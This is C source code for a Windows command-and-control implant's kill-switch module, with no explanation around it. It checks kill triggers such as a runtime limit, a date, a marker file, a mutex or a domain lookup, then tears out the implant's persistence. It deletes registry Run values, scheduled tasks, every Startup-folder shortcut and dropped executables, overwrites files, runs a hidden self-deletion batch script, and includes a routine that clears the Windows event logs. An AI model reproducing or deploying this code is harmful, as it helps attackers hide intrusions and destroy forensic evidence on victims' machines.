/*
 * Kill Switch - Self-destruct and cleanup
 * C2 beacon termination
 */

#include <windows.h>
#include <shlobj.h>
#include <winsock2.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ws2_32.lib")

// ============================================================================
// KILL CONFIG
// ============================================================================

#pragma pack(push,1)
typedef struct {
    BOOL  enabled;
    DWORD max_runtime;      // Seconds
    DWORD kill_date;        // Unix timestamp
    char  kill_file[260];   // Kill file path
    char  kill_mutex[64];   // Kill mutex name
    char  kill_domain[128]; // Kill domain
} KILL_CFG;
#pragma pack(pop)

static KILL_CFG g_cfg = {
    .enabled = 1,
    .max_runtime = 86400 * 30,
    .kill_date = 0,
    .kill_file = "C:\\kill.txt",
    .kill_mutex = "Global\\KILLSWITCH",
    .kill_domain = ""
};

static DWORD g_start = 0;

// ============================================================================
// CONDITION CHECKS
// ============================================================================

BOOL chk_runtime(void)
{
    if(g_cfg.max_runtime == 0) return 0;
    DWORD elapsed = (GetTickCount() - g_start) / 1000;
    return elapsed > g_cfg.max_runtime;
}

BOOL chk_date(void)
{
    if(g_cfg.kill_date == 0) return 0;

    SYSTEMTIME st;
    GetSystemTime(&st);

    // Simplified timestamp
    DWORD now = ((st.wYear - 1970) * 365 * 24 * 3600) +
                (st.wMonth * 30 * 24 * 3600) +
                (st.wDay * 24 * 3600);

    return now > g_cfg.kill_date;
}

BOOL chk_file(void)
{
    if(g_cfg.kill_file[0] == 0) return 0;
    return GetFileAttributesA(g_cfg.kill_file) != INVALID_FILE_ATTRIBUTES;
}

BOOL chk_mutex(void)
{
    if(g_cfg.kill_mutex[0] == 0) return 0;
    HANDLE h = OpenMutexA(0x100000, 0, g_cfg.kill_mutex);  // SYNCHRONIZE
    if(h) {
        CloseHandle(h);
        return 1;
    }
    return 0;
}

BOOL chk_domain(void)
{
    if(g_cfg.kill_domain[0] == 0) return 0;
    struct hostent* he = gethostbyname(g_cfg.kill_domain);
    return he != 0;
}

BOOL should_kill(void)
{
    if(!g_cfg.enabled) return 0;
    return chk_runtime() || chk_date() || chk_file() || chk_mutex() || chk_domain();
}

// ============================================================================
// CLEANUP - REGISTRY
// ============================================================================

void clean_reg(void)
{
    char* keys[] = {
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        0
    };

    char* vals[] = {"Beacon", "Agent", "Update", "Service", 0};

    for(int k = 0; keys[k]; k++) {
        HKEY hK;
        if(RegOpenKeyExA(0x80000001, keys[k], 0, 2, &hK) == 0) {
            for(int v = 0; vals[v]; v++)
                RegDeleteValueA(hK, vals[v]);
            RegCloseKey(hK);
        }
    }
}

// ============================================================================
// CLEANUP - SCHEDULED TASKS
// ============================================================================

void clean_tasks(void)
{
    char* tasks[] = {"Beacon", "Update", "Sync", 0};

    for(int i = 0; tasks[i]; i++) {
        char cmd[256];
        wsprintfA(cmd, "schtasks /delete /tn \"%s\" /f", tasks[i]);

        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        si.dwFlags = 1;
        si.wShowWindow = 0;

        if(CreateProcessA(0, cmd, 0, 0, 0, 0x08000000, 0, 0, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
}

// ============================================================================
// CLEANUP - STARTUP FOLDER
// ============================================================================

void clean_startup(void)
{
    char startup[260];
    if(FAILED(SHGetFolderPathA(0, 7, 0, 0, startup)))
        return;

    char search[260];
    wsprintfA(search, "%s\\*.lnk", startup);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(search, &fd);
    if(h == INVALID_HANDLE_VALUE) return;

    do {
        char path[260];
        wsprintfA(path, "%s\\%s", startup, fd.cFileName);
        DeleteFileA(path);
    } while(FindNextFileA(h, &fd));

    FindClose(h);
}

// ============================================================================
// CLEANUP - FILES
// ============================================================================

void clean_files(void)
{
    char* paths[] = {
        "C:\\ProgramData\\beacon.exe",
        "C:\\ProgramData\\agent.dll",
        "C:\\Users\\Public\\update.exe",
        0
    };

    for(int i = 0; paths[i]; i++) {
        SetFileAttributesA(paths[i], 0x80);  // NORMAL
        DeleteFileA(paths[i]);
    }
}

// ============================================================================
// CLEANUP - EVENT LOGS
// ============================================================================

void clean_logs(void)
{
    char* logs[] = {"Security", "System", "Application", 0};

    for(int i = 0; logs[i]; i++) {
        HANDLE h = OpenEventLogA(0, logs[i]);
        if(h) {
            ClearEventLogA(h, 0);
            CloseEventLog(h);
        }
    }
}

// ============================================================================
// SECURE DELETE
// ============================================================================

BOOL secure_del(char* path)
{
    HANDLE h = CreateFileA(path, 0x40000000, 0, 0, 3, 0, 0);
    if(h == INVALID_HANDLE_VALUE)
        return DeleteFileA(path);

    DWORD sz = GetFileSize(h, 0);

    BYTE junk[4096];
    for(int i = 0; i < 4096; i++)
        junk[i] = (BYTE)(GetTickCount() ^ i);

    DWORD wr, rem = sz;
    while(rem > 0) {
        DWORD n = (rem > 4096) ? 4096 : rem;
        WriteFile(h, junk, n, &wr, 0);
        rem -= wr;
    }

    CloseHandle(h);
    return DeleteFileA(path);
}

// ============================================================================
// SELF DELETE
// ============================================================================

void self_delete(void)
{
    char exe[260], tmp[260], bat[260];

    GetModuleFileNameA(0, exe, 260);
    GetTempPathA(260, tmp);
    wsprintfA(bat, "%s\\c.bat", tmp);

    HANDLE h = CreateFileA(bat, 0x40000000, 0, 0, 2, 2, 0);
    if(h != INVALID_HANDLE_VALUE) {
        char buf[512];
        int len = wsprintfA(buf,
            "@echo off\n"
            ":L\n"
            "del /f /q \"%s\"\n"
            "if exist \"%s\" goto L\n"
            "del /f /q \"%s\"\n",
            exe, exe, bat);

        DWORD wr;
        WriteFile(h, buf, len, &wr, 0);
        CloseHandle(h);

        char cmd[320];
        wsprintfA(cmd, "cmd.exe /c \"%s\"", bat);

        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        si.dwFlags = 1;
        si.wShowWindow = 0;

        CreateProcessA(0, cmd, 0, 0, 0, 0x08000000, 0, 0, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

void self_delete_cmd(void)
{
    char exe[260];
    GetModuleFileNameA(0, exe, 260);

    char cmd[512];
    wsprintfA(cmd, "cmd.exe /c ping 127.0.0.1 -n 3 > nul && del /f /q \"%s\"", exe);

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = 1;
    si.wShowWindow = 0;

    CreateProcessA(0, cmd, 0, 0, 0, 0x08000000, 0, 0, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// ============================================================================
// FULL KILL SEQUENCE
// ============================================================================

void kill_execute(void)
{
    clean_reg();
    clean_tasks();
    clean_startup();
    clean_files();
    // clean_logs();  // Noisy
    self_delete();
    ExitProcess(0);
}

// ============================================================================
// KILL THREAD - Periodic check
// ============================================================================

DWORD WINAPI kill_thread(LPVOID p)
{
    g_start = GetTickCount();

    while(1) {
        if(should_kill())
            kill_execute();
        Sleep(60000);  // Check every minute
    }

    return 0;
}

void kill_start(void)
{
    CreateThread(0, 0, kill_thread, 0, 0, 0);
}

// ============================================================================
// CONFIGURE
// ============================================================================

void kill_set_runtime(DWORD sec)
{
    g_cfg.max_runtime = sec;
}

void kill_set_date(DWORD ts)
{
    g_cfg.kill_date = ts;
}

void kill_set_file(char* path)
{
    lstrcpynA(g_cfg.kill_file, path, 260);
}

void kill_set_mutex(char* name)
{
    lstrcpynA(g_cfg.kill_mutex, name, 64);
}

void kill_set_domain(char* dom)
{
    lstrcpynA(g_cfg.kill_domain, dom, 128);
}

void kill_enable(BOOL on)
{
    g_cfg.enabled = on;
}

// ============================================================================
// EOF
// ============================================================================
